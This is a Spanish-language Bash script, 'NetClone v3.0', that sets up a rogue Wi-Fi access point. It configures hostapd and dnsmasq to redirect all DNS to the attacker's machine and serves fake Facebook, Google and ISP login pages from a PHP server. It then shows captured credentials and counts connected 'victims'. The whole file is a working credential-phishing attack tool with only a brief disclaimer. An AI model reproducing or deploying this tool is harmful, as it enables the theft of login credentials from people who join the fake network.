#!/bin/bash

# NetClone v3.0, Author @Bons18

# Colores (Cambiados a tonos morados)
endColour="\033[0m\e[0m"
purpleColour="\e[0;35m\033[1m"
darkPurpleColour="\e[0;34m\033[1m"
lightPurpleColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
yellowColour="\e[0;33m\033[1m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n\n${lightPurpleColour}[*]${endColour}${grayColour} Saliendo...\n${endColour}"
	rm dnsmasq.conf hostapd.conf 2>/dev/null
	rm -r iface 2>/dev/null
	find \-name datos-privados.txt | xargs rm 2>/dev/null
	sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
	iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
	ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
	tput cnorm; service network-manager restart
	exit 0
}

function banner(){
    echo -e "\n${purpleColour} ▐ ▄ ▄▄▄ .▄▄▄▄▄ ▄▄· ▄▄▌         ▐ ▄ ▄▄▄ ."
    sleep 0.05
    echo -e "•█▌▐█▀▄.▀·•██  ▐█ ▌▪██•  ▪     •█▌▐█▀▄.▀·"
    sleep 0.05
    echo -e "▐█▐▐▌▐▀▀▪▄ ▐█.▪██ ▄▄██▪   ▄█▀▄ ▐█▐▐▌▐▀▀▪▄"
    sleep 0.05
    echo -e "██▐█▌▐█▄▄▌ ▐█▌·▐███▌▐█▌▐▌▐█▌.▐▌██▐█▌▐█▄▄▌"
    sleep 0.05
    echo -e "▀▀ █▪ ▀▀▀  ▀▀▀ ·▀▀▀ .▀▀▀  ▀█▄▀▪▀▀ █▪ ▀▀▀${endColour}"
    sleep 0.05
}

function helpPanel(){
    echo -e "\n${purpleColour}[*]${endColour}${grayColour} Uso: ./netclone.sh${endColour}"
    echo -e "\n\t${purpleColour}m)${endColour}${grayColour} Modo (terminal o gui)${endColour}"
    exit 0
}

function dependencies(){
	sleep 1.5; counter=0
	echo -e "\n${lightPurpleColour}[*]${endColour}${grayColour}Verificando programas requeridos...\n"
	sleep 1

    dependencias=(php dnsmasq hostapd)

    for programa in "${dependencias[@]}"; do
        if [ "$(command -v $programa)" ]; then
            echo -e ". . . . . . . . ${darkPurpleColour}[V]${endColour}${grayColour} La herramienta${endColour}${purpleColour} $programa${endColour}${grayColour} Está instalada."
            let counter+=1
        else
            echo -e "${purpleColour}[X]${endColour}${grayColour} La herramienta${endColour}${purpleColour} $programa${endColour}${grayColour} No está instalada."
        fi; sleep 0.4
    done

    if [ "$counter" == "3" ]; then
        echo -e "\n${lightPurpleColour}[*]${endColour}${grayColour} Iniciando...\n"
        sleep 3
    else
        echo -e "\n${purpleColour}[!]${endColour}${grayColour} Necesitas tener instaladas php, dnsmasq y hostapd para ejecutar este script${endColour}\n"
        tput cnorm; exit
    fi
}

function getCredentials(){
	activeHosts=0
	tput civis; while true; do
		echo -e "\n${lightPurpleColour}[*]${endColour}${grayColour} Esperando credenciales... (${endColour}${purpleColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
		for i in $(seq 1 60); do echo -ne "${purpleColour}-"; done && echo -e "${endColour}"
		echo -e "${purpleColour}Víctimas conectadas: ${endColour}${darkPurpleColour}$activeHosts${endColour}\n"
		find \-name datos-privados.txt | xargs cat 2>/dev/null
		for i in $(seq 1 60); do echo -ne "${purpleColour}-"; done && echo -e "${endColour}"
		activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
		sleep 3; clear
	done
}

function startAttack(){
	clear; if [[ -e credenciales.txt ]]; then
		rm -rf credenciales.txt
	fi

	echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Listando interfaces de red disponibles...${endColour}"; sleep 1

	# Si la interfaz posee otro nombre, cambiarlo en este punto (consideramos que se llama wlan0 por defecto)
	airmon-ng start wlan0 > /dev/null 2>&1; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
	counter=1; for interface in $(cat iface); do
		echo -e "\t\n${blueColour}$counter.${endColour}${yellowColour} $interface${endColour}"; sleep 0.26
		let counter++
	done; tput cnorm
	checker=0; while [ $checker -ne 1 ]; do
		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz (ejemplo: wlan0mon): ${endColour}" && read choosed_interface

		for interface in $(cat iface); do
			if [ "$choosed_interface" == "$interface" ]; then
				checker=1
			fi
		done; if [ $checker -eq 0 ]; then echo -e "\n${redColour}[!]${endColour}${yellowColour} La interfaz ingresada no existe.${endColour}"; fi
	done

	rm iface 2>/dev/null
	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar (ejemplo: WifiGratis)::${endColour} " && read -r use_ssid
	echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} " && read use_channel; tput civis
	echo -e "\n${redColour}[!] Terminando todas las conexiones...${endColour}\n"
	sleep 2
	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
	sleep 5

	echo -e "interface=$choosed_interface\n" > hostapd.conf
	echo -e "driver=nl80211\n" >> hostapd.conf
	echo -e "ssid=$use_ssid\n" >> hostapd.conf
	echo -e "hw_mode=g\n" >> hostapd.conf
	echo -e "channel=$use_channel\n" >> hostapd.conf
	echo -e "macaddr_acl=0\n" >> hostapd.conf
	echo -e "auth_algs=1\n" >> hostapd.conf
	echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf

	echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando interfaz... $choosed_interface${endColour}\n"
	sleep 2
	echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
	hostapd hostapd.conf > /dev/null 2>&1 &
	sleep 6

	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}"
	echo -e "interface=$choosed_interface\n" > dnsmasq.conf
	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
	echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
	echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
	echo -e "server=8.8.8.8\n" >> dnsmasq.conf
	echo -e "log-queries\n" >> dnsmasq.conf
	echo -e "log-dhcp\n" >> dnsmasq.conf
	echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
	echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf

	ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
	sleep 1
	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	sleep 1
	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
	sleep 5

	plantillas=(
    facebook-login 
    google-login 
    optimumwifi 
    )

	tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${blueColour} El uso de esta herramienta es bajo tu responsabilidad.${endColour}\n\n"
	echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, optimumwifi):${endColour} " && read template

	check_plantillas=0; for plantilla in "${plantillas[@]}"; do
		if [ "$plantilla" == "$template" ]; then
			check_plantillas=1
		fi
	done

	if [ $check_plantillas -eq 1 ]; then
		tput civis; pushd $template > /dev/null 2>&1
		echo -e "\n${blueColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 2
		popd > /dev/null 2>&1; getCredentials
	else
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} $template${endColour}\n"; sleep 1
		pushd $template > /dev/null 2>&1
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 2
		popd > /dev/null 2>&1; getCredentials
	fi
}

function guiMode(){
	whiptail --title "NetClone - by Bons18" --msgbox "Bienvenido a NetClone, una herramienta ofensiva para desplegar un Rogue AP a medida." 8 78
	whiptail --title "NetClone - by Bons18" --msgbox "Verificando requisitos antes de iniciar..." 8 78

	tput civis; dependencias=(php dnsmasq hostapd)

    counter_dep=0; for programa in "${dependencias[@]}"; do
        if [ "$(command -v $programa)" ]; then
            let counter_dep+=1
        fi; sleep 0.4
    done

    if [ $counter_dep -eq "3" ]; then
		whiptail --title "NetClone - by Bons18" --msgbox "Todo en orden, tienes lo necesario." 8 78
		tput civis
    else
		whiptail --title "NetClone - by Bons18" --msgbox "Faltan dependencias: instala PHP, Dnsmasq y Hostapd." 8 78
        exit 1
    fi

	tput civis; if [[ -e credenciales.txt ]]; then
        rm -rf credenciales.txt
    fi

	whiptail --title "NetClone - by Bons18" --msgbox "Listando interfaces de red disponibles. Selecciona una que acepte el modo monitor." 8 78

	tput civis; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
    counter=1; for interface in $(cat iface); do
        let counter++
    done
    checker=0; while [ $checker -ne 1 ]; do
		choosed_interface=$(whiptail --inputbox "Interfaces de red disponibles:\n\n$(ifconfig | cut -d ' ' -f 1 | xargs | tr -d ':' | tr ' ' '\n' | while read line; do echo "[*] $line"; done)" 13 78 --title "NetClone - Interfaces de red" 3>&1 1>&2 2>&3)
        for interface in $(cat iface); do
            if [ "$choosed_interface" == "$interface" ]; then
                checker=1
            fi
        done; if [ $checker -eq 0 ]; then whiptail --title "NetClone - Error en la selección de interfaz" --msgbox "La interfaz ingresada no existe. Verifica y vuelve a intentarlo." 8 78; fi
    done

	tput civis; whiptail --title "NetClone - by Bons18" --msgbox "A continuación se va a configurar la interfaz $choosed_interface en modo monitor..." 8 78
	tput civis; airmon-ng start $choosed_interface > /dev/null 2>&1; choosed_interface="${choosed_interface}mon"

	rm iface 2>/dev/null
	use_ssid=$(whiptail --inputbox "Introduce el nombre del punto de acceso a utilizar (Ej: wifiGratis):" 8 78 --title "NetClone - by Bons18" 3>&1 1>&2 2>&3)
	whiptail --title "NetClone - by Bons18" --checklist \
	"Selecciona el canal bajo el cual quieres que el punto de acceso opere (Presiona la tecla <Espacio> para seleccionar el canal)" 20 78 12 \
	1 "(Usar este canal) " OFF \
	2 "(Usar este canal) " OFF \
    3 "(Usar este canal) " OFF \
    4 "(Usar este canal) " OFF \
    5 "(Usar este canal) " OFF \
    6 "(Usar este canal) " OFF \
    7 "(Usar este canal) " OFF \
    8 "(Usar este canal) " OFF \
    9 "(Usar este canal) " OFF \
    10 "(Usar este canal) " OFF \
    11 "(Usar este canal) " OFF \
	12 "(Usar este canal) " OFF 2>use_channel

	use_channel=$(cat use_channel | tr -d '"'); rm use_channel

	whiptail --title "NetClone - by Bons18" --msgbox "Perfecto, generando archivos de configuración para el ataque..." 8 78

	tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando... Por favor, espera unos segundos.${endColour}"
    sleep 2
    killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
    sleep 5

    echo -e "interface=$choosed_interface\n" > hostapd.conf
    echo -e "driver=nl80211\n" >> hostapd.conf
    echo -e "ssid=$use_ssid\n" >> hostapd.conf
    echo -e "hw_mode=g\n" >> hostapd.conf
    echo -e "channel=$use_channel\n" >> hostapd.conf
    echo -e "macaddr_acl=0\n" >> hostapd.conf
    echo -e "auth_algs=1\n" >> hostapd.conf
    echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf

    sleep 2
    hostapd hostapd.conf > /dev/null 2>&1 &
    sleep 6

    echo -e "interface=$choosed_interface\n" > dnsmasq.conf
    echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
    echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
    echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
    echo -e "server=8.8.8.8\n" >> dnsmasq.conf
    echo -e "log-queries\n" >> dnsmasq.conf
    echo -e "log-dhcp\n" >> dnsmasq.conf
    echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
    echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf

    ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
    sleep 1
    route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
    sleep 1
    dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
    sleep 5

    # Array de plantillas
    plantillas=(facebook-login google-login optimumwifi)

	whiptail --title "NetClone - by Bons18" --msgbox "¡Listo! Ahora elige tu plantilla." 8 78

    whiptail --title "NetClone - by Bons18" --checklist --separate-output "Selecciona la plantilla que quieres usar." 20 103 12 \
    facebook-login "Plantilla de inicio de sesión de Facebook" OFF \
    google-login "Plantilla de inicio de sesión de Google" OFF \
    optimumwifi "Plantilla de inicio de sesión para el uso de WiFi (Selección de ISP)" OFF \
	personalizada "Uso de plantilla personalizada" OFF 2>template

	template=$(cat template | tr -d '"'); rm template

    check_plantillas=0; for plantilla in "${plantillas[@]}"; do
        if [ "$plantilla" == "$template" ]; then
            check_plantillas=1
        fi
    done

    clear

    if [ $check_plantillas -eq 1 ]; then
		whiptail --title "NetClone - by Bons18" --msgbox "¡Todo listo! En breve, el punto de acceso estará activo. Ahora, solo queda esperar a que las víctimas se conecten." 8 78
        tput civis; pushd $template > /dev/null 2>&1
        php -S 192.168.1.1:80 > /dev/null 2>&1 &
        sleep 2
        popd > /dev/null 2>&1; getCredentials
	else
		whiptail --title "NetClone - by Bons18" --msgbox "Veo que prefieres usar tu propia plantilla, sabia elección :)" 8 78
		template=$(whiptail --title "NetClone - by Bons18" --inputbox "¡Pues vamos a ello!, dime el nombre de tu plantilla (debes crear un directorio con el mismo nombre):" 13 78 --title "NetClone - Plantilla personalizada" 3>&1 1>&2 2>&3)
        pushd $template > /dev/null 2>&1
        php -S 192.168.1.1:80 > /dev/null 2>&1 &
        sleep 2
        popd > /dev/null 2>&1; getCredentials
    fi
}

# Main Program
if [ "$(id -u)" == "0" ]; then
	declare -i parameter_enable=0; while getopts ":m:h:" arg; do
		case $arg in
			m) mode=$OPTARG && let parameter_enable+=1;;
			h) helpPanel;;
		esac
	done

	if [ $parameter_enable -ne 1 ]; then
		helpPanel
	else
		if [ "$mode" == "terminal" ]; then
			tput civis; banner
			dependencies
			startAttack
		elif [ "$mode" == "gui" ]; then
			guiMode
		else
			echo -e "Modo no conocido"
			exit 1
		fi
	fi
else
	echo -e "\n${redColour}[!] Es necesario ser root para ejecutar la herramienta${endColour}"
	exit 1
fi

